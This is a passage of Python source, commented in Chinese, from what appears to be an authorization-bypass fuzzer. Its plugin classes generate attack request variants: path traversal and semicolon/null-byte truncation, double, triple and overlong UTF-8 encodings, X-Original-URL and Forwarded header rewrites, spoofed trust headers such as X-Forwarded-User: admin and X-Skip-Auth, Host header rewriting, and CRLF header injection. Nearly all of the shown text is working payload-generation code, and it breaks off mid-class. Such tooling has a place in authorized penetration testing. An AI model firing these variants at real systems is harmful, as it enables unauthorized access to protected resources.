            # 不同实现在 %00 前后截断位置不同，组合形态可同时命中两类差异
            V("路径规范化", "段间 /..%00;/", f"/{first}/..%00;/{rest}" if rest else op + "/..%00;/", c),
            V("路径规范化", "段间 /..;%00/", f"/{first}/..;%00/{rest}" if rest else op + "/..;%00/", c),
            V("路径规范化", "段间 /.%00./", f"/{first}/.%00./{rest}" if rest else op + "/.%00./", c),
            V("路径规范化", "段间 ;%2f 分隔", f"/{first};%2f{rest}" if rest else op + ";%2f", c),
        ]


class EncodingPlugin(VariantPlugin):
    """v3.2 [需求2] 编码解码差异：编码在不同层被解一次/两次或解码顺序不同，
    用于检查容器是否在路由前解码、安全层看原始 URL 而业务层看解码后路径"""
    category = "编码解码"

    def generate(self, ctx):
        c = ctx
        op, first, rest, tail = c["orig_path"], c["first"], c["rest"], c["tail_rest"]
        segs = c["segs"]
        V = self._build
        variants = []
        if first:
            variants.append(V("编码解码", "保留编码字符 尾字符编码",
                              "/" + first[:-1] + pct_encode_char(first[-1]) + tail, c))
            variants.append(V("编码解码", "单重编码 首段全编码", "/" + pct_encode(first) + tail, c))
            variants.append(V("编码解码", "双重编码 首段全编码", "/" + pct_encode(first, double=True) + tail, c))
        variants += [
            V("编码解码", "编码斜杠 分隔符 %2f", "/" + "%2f".join(segs), c),
            V("编码解码", "编码斜杠 大写 %2F", "/" + "%2F".join(segs), c),
            V("编码解码", "编码点号 前缀 /%2e", "/%2e" + op, c),
            V("编码解码", "编码点号 双重 /%252e", "/%252e" + op, c),
            V("编码解码", "编码分号 尾部 %3b", op + "%3b", c),
            V("编码解码", "双重编码 %252f 分隔", "/" + "%252f".join(segs), c),
            V("编码解码", "非规范UTF-8 斜杠 %c0%af", "/" + "%c0%af".join(segs), c),
            V("编码解码", "非规范UTF-8 斜杠 %e0%80%af", "/" + "%e0%80%af".join(segs), c),
            V("编码解码", "容错编码 %u002f (IIS风格)", "/" + "%u002f".join(segs), c),
            # v3.3 扩充：三重编码、大小写混合、分段编码、双重编码特殊字符
            V("编码解码", "三重编码 %25252f 分隔", "/" + "%25252f".join(segs), c),
            V("编码解码", "大小写混合编码 %2F%2f", "/" + "%2F%2f".join(segs), c),
            V("编码解码", "双重编码井号 %2523", op + "%2523", c),
            V("编码解码", "双重编码问号 %253f", op + "%253f", c),
            V("编码解码", "非规范UTF-8 点号 %c0%ae", "/" + "%c0%ae".join(segs), c),
            # v4.1 [P2] Zerod.go/UnicodeFull.go 对齐：大写内层双编码与
            # overlong 反斜杠——部分解码器仅按小写 %252f 归一，漏掉大写内层
            V("编码解码", "大写内层双编码 %25%32%66 分隔", "/" + "%25%32%66".join(segs), c),
            V("编码解码", "Overlong 反斜杠 %c1%9c 分隔", "/" + "%c1%9c".join(segs), c),
        ]
        # v3.3 扩充：末段全编码（仅多级路径）
        if rest:
            variants.append(V("编码解码", "末段全编码",
                              "/" + "/".join(segs[:-1]) + "/" + pct_encode(segs[-1]), c))
        return variants


class TailSuffixPlugin(VariantPlugin):
    """v3.2 [需求4] 尾缀差异：检查鉴权规则是否只匹配"目录名"而非真实解析路径"""
    category = "尾缀差异"

    def generate(self, ctx):
        c = ctx
        op = c["orig_path"]
        V = self._build
        variants = [
            V("尾缀差异", "尾部斜杠", op + "/", c),
            V("尾缀差异", "尾部点号", op + ".", c),
            V("尾缀差异", "尾部多点号 ...", op + "...", c),
            V("尾缀差异", "尾部斜杠+点 /.", op + "/.", c),
            V("尾缀差异", "尾部编码点 %2e", op + "%2e", c),
        ]
        for suf in (".json", ".html", ".txt", ".jsf", ".faces", ".xhtml", ".svg"):
            variants.append(V("尾缀差异", f"伪后缀 {suf}", op + suf, c))
        variants += [
            V("尾缀差异", "追加无关片段 /x", op + "/x", c),
            V("尾缀差异", "追加无关片段 /x/y", op + "/x/y", c),
            V("尾缀差异", "追加空格段 /%20", op + "/%20", c),
            V("尾缀差异", "追加随机段 /zzprobe", op + "/zzprobe", c),
            V("尾缀差异", "追加 /./", op + "/./", c),
            V("尾缀差异", "追加 /;/", op + "/;/", c),
            # v3.3 扩充：备份尾缀、编辑器残留尾缀、组合尾缀
            V("尾缀差异", "尾波浪号 ~", op + "~", c),
            V("尾缀差异", "备份尾缀 .bak", op + ".bak", c),
            V("尾缀差异", "编辑器残留 .swp", op + ".swp", c),
            V("尾缀差异", "版本尾缀 .1", op + ".1", c),
            V("尾缀差异", "组合尾缀 /.;", op + "/.;", c),
            V("尾缀差异", "分号伪后缀 ;.json", op + ";.json", c),
            V("尾缀差异", "尾部斜杠+编码点 /%2e", op + "/%2e", c),
            # v4.1 [P2] EndPaths.go/Suffix.go 对齐：%ff 穿越、注释段、未知后缀
            V("尾缀差异", "尾部 /..%ff/", op + "/..%ff/", c),
            V("尾缀差异", "尾部 /**/ 注释段", op + "/**/", c),
            V("尾缀差异", "未知后缀 .rand", op + ".rand", c),
        ]
        return variants


class RedirectProbePlugin(VariantPlugin):
    """v3.2 [需求6] 重定向差异：follow=True 标记的变形触发多级跳转链追踪，
    与基线跳转链对比落点，Location 与最终响应正文联合判断"""
    category = "重定向差异"

    def generate(self, ctx):
        c = ctx
        op, first, rest = c["orig_path"], c["first"], c["rest"]
        V = self._build
        return [
            V("重定向差异", "原路径基线跳转链追踪", op, c, follow=True),
            V("重定向差异", "尾斜杠规范化跳转", op + "/", c, follow=True),
            V("重定向差异", "大写触发规范化跳转", op.upper(), c, follow=True),
            V("重定向差异", "双斜杠前缀代理规范化", "//" + "/".join(c["segs"]), c, follow=True),
            V("重定向差异", "自消解点段跳转",
              f"/{first}/../{first}/{rest}" if rest else f"/{first}/../{first}", c, follow=True),
            V("重定向差异", "尾点号规范化跳转", op + ".", c, follow=True),
            # v3.3 扩充：编码斜杠/反斜杠/点段前缀触发的规范化跳转
            V("重定向差异", "编码斜杠规范化跳转", "/" + "%2f".join(c["segs"]), c, follow=True),
            V("重定向差异", "反斜杠规范化跳转", "/" + "\\".join(c["segs"]), c, follow=True),
            V("重定向差异", "点段前缀 /./ 跳转", "/./" + "/".join(c["segs"]), c, follow=True),
            V("重定向差异", "分号后缀规范化跳转", op + ";", c, follow=True),
        ]


class HeaderRewritePlugin(VariantPlugin):
    """v3.2 [需求7] 请求头重写——环境特征探测（而非默认攻击路径）：
    识别站点是否存在"路径改写链"（网关/代理参考 X-Original-URL / Forwarded 等），
    帮助后续选择更合理的测试分支"""
    category = "请求头重写"

    def generate(self, ctx):
        c = ctx
        op, qo = c["orig_path"], c["qo"]
        host = urlparse(c["prefix"]).netloc
        V = self._build
        return [
            V("请求头重写", "[环境探测] X-Override-URL", "/", c,
              headers={"X-Override-URL": op + qo}, keep_query=False),
            V("请求头重写", "[环境探测] X-Forwarded-Path", "/", c,
              headers={"X-Forwarded-Path": op + qo}, keep_query=False),
            V("请求头重写", "[环境探测] X-URL", "/", c,
              headers={"X-URL": op + qo}, keep_query=False),
            V("请求头重写", "[环境探测] Forwarded(RFC7239)", "/", c,
              headers={"Forwarded": f"for=127.0.0.1;host={host}"}, keep_query=False),
            V("请求头重写", "[环境探测] X-Forwarded-Uri 编码路径", "/", c,
              headers={"X-Forwarded-Uri": pct_encode(op[1:]) + qo}, keep_query=False),
            V("请求头重写", "[环境探测] X-Original-URL 变形值(../;/)", "/", c,
              headers={"X-Original-URL": "/x/..;/" + op.lstrip("/") + qo}, keep_query=False),
            V("请求头重写", "[环境探测] X-Original-URL 反向(鉴权看头/路由看真实路径)", op, c,
              headers={"X-Original-URL": "/"}),
            V("请求头重写", "[环境探测] X-Original-URL+XFF 组合", "/", c,
              headers={"X-Original-URL": op + qo, "X-Forwarded-For": "127.0.0.1"}, keep_query=False),
            # v3.3 扩充：编码+分号组合值、反向 Rewrite、多头组合、Forwarded 变体
            V("请求头重写", "[环境探测] X-Original-URL 编码+分号", "/", c,
              headers={"X-Original-URL": pct_encode(op[1:]) + ";a=1" + qo}, keep_query=False),
            V("请求头重写", "[环境探测] X-Rewrite-URL 反向(鉴权看头)", op, c,
              headers={"X-Rewrite-URL": "/"}),
            V("请求头重写", "[环境探测] X-Rewrite-URL 穿越值", "/", c,
              headers={"X-Rewrite-URL": "/x/..;/" + op.lstrip("/") + qo}, keep_query=False),
            V("请求头重写", "[环境探测] X-Original-URL+X-Forwarded-Prefix 组合", "/", c,
              headers={"X-Original-URL": op + qo, "X-Forwarded-Prefix": "/"}, keep_query=False),
            V("请求头重写", "[环境探测] Forwarded host 伪造(RFC7239)", "/", c,
              headers={"Forwarded": f"for=127.0.0.1;host={host};proto=https"}, keep_query=False),
            V("请求头重写", "[环境探测] X-Forwarded-Path 编码值", "/", c,
              headers={"X-Forwarded-Path": pct_encode(op[1:]) + qo}, keep_query=False),
        ]


class UnicodeNormalizationPlugin(VariantPlugin):
    """v3.4 [G1] Unicode 规范化差异：服务器/代理/框架对 NFC/NFD/NFKC/NFKD
    规范化不一致；同形字符（Cyrillic а U+0430 vs 拉丁 a）；casefold 折叠。"""
    category = "Unicode规范化"

    def generate(self, ctx):
        c = ctx
        op = c["orig_path"]
        V = self._build
        variants = []
        for tag, norm in (("NFC 规范化", "NFC"), ("NFD 规范化", "NFD"),
                          ("NFKC 规范化", "NFKC"), ("NFKD 规范化", "NFKD")):
            try:
                n = unicodedata.normalize(norm, op)
            except ValueError:
                continue
            if n != op:
                variants.append(V(self.category, tag, n, c))
        # 同形字符：Cyrillic а(A) 替换拉丁 a(A)——视觉相同码点不同
        homo = op.replace("a", "\u0430").replace("A", "\u0410")
        if homo != op:
            variants.append(V(self.category, "同形字符替换(Cyrillic а)", homo, c))
        variants.append(V(self.category, "casefold 折叠", op.casefold(), c))
        # 百分号编码大小写互换（%2f → %2F / 反向），部分网关大小写敏感
        lower = re.sub(r"%[0-9A-F]{2}", lambda m: m.group(0).lower(), op)
        upper = re.sub(r"%[0-9a-f]{2}", lambda m: m.group(0).upper(), op)
        if lower != op:
            variants.append(V(self.category, "百分号编码小写化", lower, c))
        if upper != op:
            variants.append(V(self.category, "百分号编码大写化", upper, c))
        return variants


class AuthConstructPlugin(VariantPlugin):
    """v3.4 [G2] 认证/魔数头构造：Authorization 变体与内部信任头。
    攻击面偏敏感，仅在 --probe-auth 或 --categories 显式包含"认证构造"时启用。"""
    category = "认证构造"
    require_flag = "probe_auth"

    def generate(self, ctx):
        c = ctx
        op = c["orig_path"]
        V = self._build
        variants = []
        for desc, h in (
            ("Authorization Basic 空凭据", {"Authorization": "Basic Og=="}),
            ("Authorization Bearer null", {"Authorization": "Bearer null"}),
            ("Authorization Bearer undefined", {"Authorization": "Bearer undefined"}),
            ("Authorization Bearer 空值", {"Authorization": "Bearer"}),
            ("Authorization Bearer 1(弱比较)", {"Authorization": "Bearer 1"}),
            ("X-Original-User: admin", {"X-Original-User": "admin"}),
            ("X-Forwarded-User: admin", {"X-Forwarded-User": "admin"}),
            ("X-Forwarded-Group: admin", {"X-Forwarded-Group": "admin"}),
            ("X-Remote-User: admin", {"X-Remote-User": "admin"}),
            ("X-Auth-Request-User: admin", {"X-Auth-Request-User": "admin"}),
            ("X-Internal-Client: 1", {"X-Internal-Client": "1"}),
            ("X-Internal-Request: 1", {"X-Internal-Request": "1"}),
            ("X-Debug: 1", {"X-Debug": "1"}),
            ("X-Skip-Auth: 1", {"X-Skip-Auth": "1"}),
            ("X-API-Key: 空值", {"X-API-Key": ""}),
            ("X-Original-User + XFF 组合", {"X-Original-User": "admin", "X-Forwarded-For": "127.0.0.1"}),
        ):
            variants.append(V(self.category, desc, op, c, headers=h))
        return variants


class HostRewritePlugin(VariantPlugin):
    """v3.4 [G3] Host 头直接改写：虚拟主机路由 / 反代按 Host 分流场景下的绕过面"""
    category = "Host改写"

    def generate(self, ctx):
        c = ctx
        op = c["orig_path"]
        V = self._build
        host = urlparse(c["prefix"]).netloc.split(":")[0]
        return [
            V(self.category, "Host: localhost", op, c, headers={"Host": "localhost"}),
            V(self.category, "Host: 127.0.0.1", op, c, headers={"Host": "127.0.0.1"}),
            V(self.category, "Host: 内网网关名", op, c, headers={"Host": "gateway"}),
            V(self.category, "Host: 目标小写", op, c, headers={"Host": host.lower()}),
            V(self.category, "Host: 目标大写", op, c, headers={"Host": host.upper()}),
            V(self.category, "Host: 目标+8080端口", op, c, headers={"Host": f"{host}:8080"}),
            V(self.category, "Host: 空值", op, c, headers={"Host": ""}),
            V(self.category, "Host:localhost + XFF:127.0.0.1", op, c,
              headers={"Host": "localhost", "X-Forwarded-For": "127.0.0.1"}),
        ]


class AbsoluteUriPlugin(VariantPlugin):
    """v3.4 [G4] absolute-form 请求行（GET http://host/path HTTP/1.1）：
    借 HTTP 代理协议语义让请求行携带完整 URL——安全层看到的 URI 与后端
    解析的路径可能不一致（经典代理差异面）。仅 http:// 目标生效
    （https 经 CONNECT 隧道后请求行仍是 origin-form）。"""
    category = "绝对URI"

    def generate(self, ctx):
        c = ctx
        op = c["orig_path"]
        V = self._build
        if not c["prefix"].startswith("http://"):
            return []
        q = ("?" + c["query"]) if c["query"] else ""
        return [
            V(self.category, "absolute-form 请求行", op + q, c, keep_query=False, use_absolute=True),
            V(self.category, "absolute-form 大写路径", op.upper() + q, c, keep_query=False, use_absolute=True),
            V(self.category, "absolute-form 双斜杠路径", "//" + "/".join(c["segs"]) + q, c, keep_query=False, use_absolute=True),
            V(self.category, "absolute-form 尾点号", op + "." + q, c, keep_query=False, use_absolute=True),
        ]


class SegmentMutatePlugin(VariantPlugin):
    """v3.5 [缺口1+3] 中段/中边界变异：补齐 EncodingPlugin 只编码首末段、
    SlashPlugin 只在首段后插双斜杠的盲区。受保护前缀挂在中间段
    （如 /api/admin/users 的 admin）时，ad%6din 与 /api/admin//users
    这类中段变形此前不会生成。"""
    category = "段变异"

    def generate(self, ctx):
        c, segs = ctx, ctx["segs"]
        V = self._build
        out = []
        for i, seg in enumerate(segs):
            if i == 0 or not seg:
                continue  # 首段已由 编码解码/特殊编码 插件覆盖
            mutated = [
                (f"段{i}首字符编码", pct_encode_char(seg[0]) + seg[1:]),
                (f"段{i}首字符双编码", pct_encode_char(seg[0], double=True) + seg[1:]),
            ]
            if len(seg) > 1:
                mid = len(seg) // 2
                mutated.append((f"段{i}中字符编码",
                                seg[:mid] + pct_encode_char(seg[mid]) + seg[mid + 1:]))
            for tag, mseg in mutated:
                out.append(V(self.category, tag, "/" + "/".join(
                    s if j != i else mseg for j, s in enumerate(segs)), c))
            out.append(V(self.category, f"段{i}前双斜杠",
                         "/" + "/".join(segs[:i]) + "//" + "/".join(segs[i:]), c))
        return out


class BorrowPrefixPlugin(VariantPlugin):
    """v3.5 [缺口2] --borrow-prefix 指定真实公开/白名单前缀借道。
    StaticPrefixPlugin 的硬编码前缀只做根级前置，命不中挂在子路径的
    公开规则（如 /api/public/**）。本插件按用户前缀生成：
      - 根级前置：/api/public/../<原路径>（网关按公开前缀放行，后端还原）
      - 段内还原：/api/public/../admin/users（.. 抵消前缀末段，还原原路径）
      - ..; 与 %2e%2e 变体（Tomcat 分号裁剪 / 编码差异）"""
    category = "借道前缀"

    def generate(self, ctx):
        c, op, segs = ctx, ctx["orig_path"], ctx["segs"]
        V = self._build
        out = []
        for raw in ctx.get("borrow_prefixes", []):
            bp = "/" + str(raw).strip("/")
            if bp == "/":
                continue
            depth = len([s for s in bp.split("/") if s])
            out.append(V(self.category, f"[指定]{bp}/../ 借道", bp + "/.." + op, c))
            out.append(V(self.category, f"[指定]{bp}/..;/ 借道", bp + "/..;" + op, c))
            out.append(V(self.category, f"[指定]{bp}/%2e%2e/ 借道", bp + "/%2e%2e" + op, c))
            k = depth - 1  # .. 抵消 bp 末段后，接原路径第 k 段起即可还原为原路径
            if 1 <= k < len(segs):
                tail = "/" + "/".join(segs[k:])
                out.append(V(self.category, f"[指定]{bp}/../ 段内还原", bp + "/.." + tail, c))
                out.append(V(self.category, f"[指定]{bp}/..;/ 段内还原", bp + "/..;" + tail, c))
            # v4.1 [P0] SxS.go 对齐：公开前缀与目标路径分号拼接——分号裁剪
            # 语义分层不一致（鉴权规则匹配裁剪后的公开路径，路由落在目标
            # 路径）时的借道形态；编码拼接对抗只解码一层的中间层
            out.append(V(self.category, f"[指定]{bp}; SxS 拼接",
                         bp + ";" + op, c))
            out.append(V(self.category, f"[指定]{bp}; SxS 编码拼接",
                         bp + ";" + op.replace("/", "%252f"), c))
            out.append(V(self.category, f"[指定]{bp};a=1 拼接",
                         bp + ";a=1" + op, c))
        return out


def alt_case(s, start_upper=False):
    """交替大小写：devices → dEvIcEs；start_upper=True 时 → DeViCeS"""
    return "".join(ch.upper() if (i % 2 == (0 if start_upper else 1)) else ch.lower()
                   for i, ch in enumerate(s))


class SegmentCasePlugin(VariantPlugin):
    """v3.6 大小写路由绕过探测（类别 AB）。
    成因：安全层与路由层对路径大小写的敏感度不一致——
    ① 网关/鉴权规则按原始字节精确匹配 /api/admin/**，对 /API/admin/**
      匹配失败而放行；后端路由（Spring AntPathMatcher、Tomcat）同样
      大小写敏感，但网关若配置了大小写不敏感匹配（或后端挂在
      Windows/IIS 等大小写不敏感文件系统上）则仍命中受保护资源；
    ② 反向场景：鉴权规则大小写不敏感、后端静态资源大小写敏感，
      大小写变形可以区分两层的匹配行为。
    CasePlugin 只做整路径/首末段笼统变换；本插件逐段枚举全部单段
    变异与跨段组合，覆盖 /API/v1/devices 型逐段大小写绕过。"""
    category = "段大小写"

    def generate(self, ctx):
        c, segs, op = ctx, ctx["segs"], ctx["orig_path"]
        V = self._build
        out = []

        def emit(desc, path):
            # 无变化不发包（如全小写路径再转小写）；重复 URL 由管线统一去重
            if path and path != op:
                out.append(V(self.category, desc, path, c))

        # 单段变异：逐段 大写/小写/首字母/交换/交替（含起大写反相）
        for i, seg in enumerate(segs):
            if not seg:
                continue

            def join_with(s, _i=i):
                return "/" + "/".join(segs[:_i] + [s] + segs[_i + 1:])

            emit(f"段{i}全大写", join_with(seg.upper()))
            emit(f"段{i}全小写", join_with(seg.lower()))
            emit(f"段{i}首字母大写", join_with(seg.capitalize()))
            emit(f"段{i}首字母小写", join_with(seg[0].lower() + seg[1:]))
            emit(f"段{i}交换大小写", join_with(seg.swapcase()))
            emit(f"段{i}交替大小写", join_with(alt_case(seg)))
            emit(f"段{i}交替大小写起大写", join_with(alt_case(seg, True)))

        # 跨段组合：单因子（仅一段改大小写）不中时，多段组合改变整体形态
        if len(segs) >= 2:
            emit("首段大写其余小写", "/" + "/".join(
                [segs[0].upper()] + [s.lower() for s in segs[1:]]))
            emit("末段大写其余小写", "/" + "/".join(
                [s.lower() for s in segs[:-1]] + [segs[-1].upper()]))
            emit("奇数位段大写", "/" + "/".join(
                s.upper() if i % 2 == 0 else s.lower() for i, s in enumerate(segs)))
            emit("偶数位段大写", "/" + "/".join(
                s.upper() if i % 2 else s.lower() for i, s in enumerate(segs)))
            emit("全小写", "/" + "/".join(s.lower() for s in segs))
            emit("交换全路径大小写", "/" + "/".join(s.swapcase() for s in segs))

        # 扩展名大小写：devices.json → devices.JSON（静态资源/导出接口场景，
        # IIS/Windows 大小写不敏感 + 网关按后缀规则精确匹配的差异面）
        last = segs[-1] if segs else ""
        if "." in last[1:]:
            stem, ext = last.rsplit(".", 1)
            emit("末段扩展名大写", "/" + "/".join(segs[:-1] + [stem + "." + ext.upper()]))
            emit("末段扩展名首字母大写", "/" + "/".join(segs[:-1] + [stem + "." + ext.capitalize()]))

        return out


class CRLFInjectionPlugin(VariantPlugin):
    """v4.1 类别 AD：CRLF 头注入 / 响应拆分（对齐 NoAuth_V2 CRLFInjection.go）。
    命中条件：安全层将 %0d%0a 序列视为普通路径字符放行，而反代/后端
    在转发或响应构造时将其解析为头边界。编码变体覆盖标准编码、
    Unicode 全宽控制符（%e5%98%8a%e5%98%8d）与 overlong UTF-8（%c0%8d%c0%8a）。"""
    category = "CRLF头注入"

    INJECT = (
        "X-Forwarded-For:%20127.0.0.1",
        "Location:%20/",
        "Content-Length:%200%0d%0a%0d%0a",
    )

    def generate(self, ctx):
        c = ctx
        op, segs = c["orig_path"], c["segs"]
        V = self._build
        out = [
            V(self.category, "前缀位 CRLF", "/%0d%0a/" + "/".join(segs), c),
            V(self.category, "段间 CRLF", "/" + "%0d%0a".join(segs), c),
            V(self.category, "双 CRLF 头终结", op + "%0d%0a%0d%0a", c),
            V(self.category, "Unicode CRLF 全宽", op + "%e5%98%8a%e5%98%8d", c),
            V(self.category, "Unicode LF 全宽", op + "%e5%98%8a", c),
            V(self.category, "Overlong CRLF", op + "%c0%8d%c0%8a", c),
        ]
        for h in self.INJECT:
            out.append(V(self.category, "尾部注入 " + h.split(":")[0],
                         op + "%0d%0a" + h, c))
        return out


class QueryFragmentPlugin(VariantPlugin):
    """v4.1 类别 AE：查询串污染（对齐 NoAuth_V2 QueryFragment.go）。
    成因：鉴权规则匹配完整 requestURI（含 query），后端路由只取 path，
    追加查询串制造规则失配；?WSDL 为 SOAP 元数据端点的经典白名单形态。
    注意：# 片段族不实现——fragment 是客户端概念，aiohttp/yarl 不发送。"""
    category = "查询污染"

    SUFFIXES = ("debug=1", "anything", "WSDL", "wsdl", "test")

    def generate(self, ctx):
        c, op = ctx, ctx["orig_path"]
        V = self._build
        q = c["query"]
        out = [V(self.category, "尾部裸问号",
                 (op + "?" + q + "?") if q else op + "?", c,
                 keep_query=False)]
        for s in self.SUFFIXES:
            out.append(V(self.category, "追加 ?" + s,
                         (op + "?" + q + "&" + s) if q else op + "?" + s,
                         c, keep_query=False))
        return out



# v4.2 URL 解析规则扩展

def _u_decode(value, count=1):
    for _ in range(count):
        value = unquote(value, errors="replace")
    return value


def _u_collapse(path):
    return re.sub(r"/{2,}", "/", path)


def _u_dot_normalize(path):
    absolute = path.startswith("/")
    trailing = path.endswith("/")
    out = []
    for part in path.split("/"):
        if part in ("", "."):
            continue
        if part == "..":
            if out and out[-1] != "..":
                out.pop()
            elif not absolute:
                out.append(part)
        else:
            out.append(part)
    result = ("/" if absolute else "") + "/".join(out)
    if not result:
        result = "/" if absolute else ""
    if trailing and result != "/":
        result += "/"
    return result


def _u_expect(path):
    once = _u_decode(path)
    twice = _u_decode(path, 2)
    return {
        "raw": path,
        "decode_once": once,
        "decode_twice": twice,
        "normalized_once": _u_dot_normalize(once),
        "normalized_twice": _u_dot_normalize(twice),
        "collapsed_once": _u_collapse(once),
        "backslash_as_separator": once.replace("\\", "/"),
    }


class URLParserMatrixPlugin(VariantPlugin):
    # v4.3 [P0-1 BUG-1 修复] category 从字母代码改为中文名（与 CATEGORY_MAP 对齐），
    # 否则 --categories AF/百分号编码矩阵 的筛选逻辑反而把本插件排除
    category = "百分号编码矩阵"
    def generate(self, ctx):
        path = ctx["orig_path"]
        targets = {"/": ["%2F", "%2f"], ".": ["%2E", "%2e"],
                   "\\": ["%5C", "%5c"], ";": ["%3B", "%3b"],
                   "?": ["%3F", "%3f"], "#": ["%23"]}
        seen = set()
        for char, encodings in targets.items():
            for enc in encodings:
                raw = path.replace(char, enc)
                if raw in seen:
                    continue
                seen.add(raw)
                v = self._build(self.category, f"百分号编码 {char!r}->{enc}", raw, ctx)
                v["mutation_chain"] = [f"percent_encode:{char}:{enc}"]
                v["parser_expectations"] = _u_expect(raw)
                yield v
        for char in ("/", ".", "\\", ";", "?", "#"):
            once = f"%{ord(char):02X}"
            raw = path.replace(char, once.replace("%", "%25"))
            if raw in seen:
                continue
            seen.add(raw)
            v = self._build(self.category, f"二次百分号编码 {char!r}", raw, ctx)
            v["mutation_chain"] = [f"double_percent_encode:{char}"]
            v["parser_expectations"] = _u_expect(raw)
            yield v
        for suffix in ("/%2", "/%GG", "/%", "/%u002f"):
            raw = path + suffix
            v = self._build(self.category, "非法或不完整百分号编码", raw, ctx)
            v["risk"] = "low"
            v["mutation_chain"] = ["malformed_percent_encoding"]
            v["parser_expectations"] = _u_expect(raw)
            yield v


class BackslashMatrixPlugin(VariantPlugin):
    category = "反斜杠解析"
    def generate(self, ctx):
        path = ctx["orig_path"]
        cases = [(path.replace("/", "\\"), "原始反斜杠"),
                 (path.replace("/", "\\\\"), "重复反斜杠"),
                 (path.replace("/", "%5C"), "编码反斜杠"),
                 (path.replace("/", "/\\"), "混合分隔符"),
                 (path.replace("/", "\\..\\"), "反斜杠与点段")]
        seen = set()
        for raw, desc in cases:
            if raw in seen:
                continue
            seen.add(raw)
            v = self._build(self.category, desc, raw, ctx)
            v["mutation_chain"] = ["backslash_parsing"]
            v["parser_expectations"] = {"literal": raw, "as_separator": raw.replace("\\", "/")}
            yield v


class DotSegmentMatrixPlugin(VariantPlugin):
    category = "点段规范化矩阵"
    def generate(self, ctx):
        path = ctx["orig_path"]
        candidates = ["/./" + path.lstrip("/"), path.rstrip("/") + "/.",
                      "/public/../" + path.lstrip("/"),
                      path.replace("/", "/./", 1), path.replace("/", "/../", 1),
                      path.replace(".", "%2E"), path.replace("..", "%2E%2E")]
        for raw in dict.fromkeys(candidates):
            v = self._build(self.category, "点段规范化", raw, ctx)
            v["mutation_chain"] = ["dot_segment"]
            v["parser_expectations"] = _u_expect(raw)
            yield v


class RepeatedSlashMatrixPlugin(VariantPlugin):
    category = "重复斜杠与路径压缩"
    def generate(self, ctx):
        path = ctx["orig_path"]
        for n in (2, 3, 4):
            raw = path.replace("/", "/" * n)
            v = self._build(self.category, f"斜杠重复 {n} 次", raw, ctx)
            v["mutation_chain"] = [f"repeat_slash:{n}"]
            v["parser_expectations"] = {"preserve": raw, "collapsed": _u_collapse(raw)}
            yield v
        for enc in ("%2F", "%2f", "%252F"):
            raw = path.replace("/", enc)
            v = self._build(self.category, f"编码斜杠 {enc}", raw, ctx)
            v["mutation_chain"] = [f"encoded_slash:{enc}"]
            v["parser_expectations"] = _u_expect(raw)
            yield v


class PathQueryBoundaryMatrixPlugin(VariantPlugin):
    category = "路径查询边界"
    def generate(self, ctx):
        path = ctx["orig_path"]
        for raw, desc in [(path + ";role=admin", "路径参数"),
                          (path + "%3Frole=admin", "编码查询边界"),
                          (path + "%23fragment", "编码片段边界"),
                          (path + ";role=user?role=admin", "路径参数查询冲突"),
                          (path + "%3Brole=admin", "编码分号参数"),
                          (path + "%253Frole=admin", "二次编码查询边界")]:
            v = self._build(self.category, desc, raw, ctx, keep_query=False)
            v["mutation_chain"] = ["path_query_boundary"]
            v["parser_expectations"] = {"raw": raw, "decode_once": _u_decode(raw),
                                         "fragment_client_only": "%23" in raw.upper()}
            yield v


class TruncationSuffixMatrixPlugin(VariantPlugin):
    category = "路径截断与后缀解析"
    def generate(self, ctx):
        path = ctx["orig_path"]
        for suffix in (".html", ".json", ".xml", ".txt", ".css", ".js", ".jsp", ".aspx"):
            for raw in (path + suffix, path + suffix + "/", path + "%2E" + suffix[1:],
                        path + "%252E" + suffix[1:], path + "%00" + suffix):
                v = self._build(self.category, f"后缀或截断 {suffix}", raw, ctx)
                v["risk"] = "low" if "%00" in raw else "medium"
                v["mutation_chain"] = [f"suffix:{suffix}"]
                v["parser_expectations"] = _u_expect(raw)
                yield v
        for raw in (path + "/.", path + "/..", path + ".", path + "..", path + "/.html"):
            v = self._build(self.category, "路径截断尾部变体", raw, ctx)
            v["risk"] = "low"
            v["mutation_chain"] = ["path_truncation"]
            v["parser_expectations"] = _u_expect(raw)
            yield v


# ===========================================================================
# v4.4 新增插件区：payload 清单缺口补齐
# （截断矩阵 / 裸矩阵参数 / fragment 边界混淆 / 前导分号穿越矩阵）
# 设计约定：
#   · 插入位置四式——前缀式（片段插在原路径最前）/ 锚段式（/x/ 借道）、
#     后缀式（接原路径尾部）/ 段间式（插在各路径段之后），_pfx_join 统一拼接；
#   · 全部复用既有类别字符串（特殊编码 / 分号参数），聚类与报告零改动；
#   · 注册于 PLUGIN_REGISTRY 尾部（v4.1 惯例），--max-variants 轮转截取时
#     先裁新类别，不挤占既有覆盖；
#   · raw 含 ? 的变体一律 keep_query=False 手工拼接，避免双 ? 歧义。
# ===========================================================================


# ---------------------------------------------------------------------------
# v4.4 [P14] 前缀拼接器：统一控制「变形片段 → 原路径」的插入位置
# ---------------------------------------------------------------------------
def _pfx_join(piece, op):
    """前缀拼接器：变形片段插入原路径最前，自动消解意外双斜杠。

    规则：piece 以 / 结尾 → /piece + op 去前导斜杠（双斜杠是独立测试点，
    由 RepeatedSlashMatrixPlugin 负责，此处不产生意外形态）；
    否则直接拼接（;x + /admin = /;x/admin，分号参数名后接下一正常段）。
    返回值保证以 / 开头——_build 的 prefix+raw 拼接要求路径必须锚定根。"""
    if piece.endswith("/"):
        return "/" + piece + op.lstrip("/")
    return "/" + piece + op


class TruncationMatrixPlugin(VariantPlugin):
    """v4.4 [缺口1+3+5] 截断字节 × 点段形态 × 分号方向全矩阵。

    原理：
    (a) 截断字节 %00 / %0d / %ff / %09 —— C 字符串语义的解析组件遇该字节
        即截断：%00 经典 Null 截断；%0d 是 CR（部分旧网关按行切分请求行）；
        %ff 是非法 UTF-8 首字节（解码器丢弃后续或整体截断）。ACL 截断点与
        路由截断点不同 → ACL 按前缀匹配通过、路由按完整串放行。
        原实现仅有 %00/%09 与分号的单一组合（TraversalPlugin v4.1），
        本插件补齐 %0d / %ff 及四个方向的全排列。
    (b) 半编码点段 %2e. / .%2e —— 正则型 ACL 通常只匹配字面 ".." 或全编码
        "%2e%2e"，半编码恰好落在两者匹配盲区；解码后仍为 ".."，
        穿越语义完整保留。
    (c) 分号方向 —— ..;X/（点段带参截断）与 ..X;/（截断后空参）在不同
        容器上的参数剥离顺序不同。

    插入位置：前缀式（/..%00/admin，插在原路径最前）；
    锚段借道式（/x/..%00;/admin，与 TraversalPlugin 同一插入惯例）。"""
    category = "特殊编码"

    TRUNC = ("%00", "%0d", "%ff", "%09")        # 截断/空白字节
